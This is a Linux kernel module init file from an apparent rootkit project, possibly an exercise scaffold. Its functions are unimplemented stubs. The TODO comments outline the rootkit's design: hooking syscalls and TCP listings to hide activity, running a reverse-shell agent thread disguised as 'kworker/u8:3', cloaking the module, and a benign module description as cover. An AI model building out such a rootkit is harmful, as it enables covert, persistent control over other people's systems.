// SPDX-License-Identifier: GPL-2.0
// core/init.c - Module init: key parsing, probe registration, agent launch.
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/string.h>

#include "rootkit.h"

// Module parameters
unsigned short peer_port;
module_param(peer_port, ushort, 0);

char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);

static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

unsigned int retry_base_ms = 5000;
module_param(retry_base_ms, uint, 0);

unsigned int retry_max_ms = 60000;
module_param(retry_max_ms, uint, 0);

unsigned int shell_timeout_ms = 60000;
module_param(shell_timeout_ms, uint, 0);

u8 rk_key[RK_KEY_LEN];

static struct task_struct *rk_thread;

static int __init rk_init(void)
{
	/*
	 * TODO: Full goto-rollback initialization chain.
	 *
	 * 1. Validate peer_port is set (reject with -EINVAL if 0).
	 * 2. Validate control_key is exactly RK_KEY_HEX_LEN chars.
	 * 3. hex2bin the key into rk_key, reject on failure.
	 * 4. memzero_explicit the hex key buffer.
	 * 5. rk_target_init all four target lists.
	 * 6. rk_shells_init.
	 * 7. Register all 6 kretprobes (getdents, read, tcp4, tcp6,
	 *    mkdir, mkdirat) with goto-rollback on each failure.
	 * 8. kthread_run(rk_agent_thread, ..., "kworker/u8:3").
	 * 9. On thread failure, unregister probes in reverse order.
	 * 10. On any failure, call rk_shells_cleanup and
	 *     memzero_explicit the key.
	 */
	return -ENOSYS;
}

static void __exit rk_exit(void)
{
	/*
	 * TODO: Reverse-order teardown.
	 *
	 * 1. kthread_stop the agent thread.
	 * 2. rk_uncloak (restore module visibility).
	 * 3. Unregister all 6 kretprobes in reverse order.
	 * 4. rk_shells_cleanup.
	 * 5. memzero_explicit the key.
	 */
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Remote control protocol over encrypted channel");
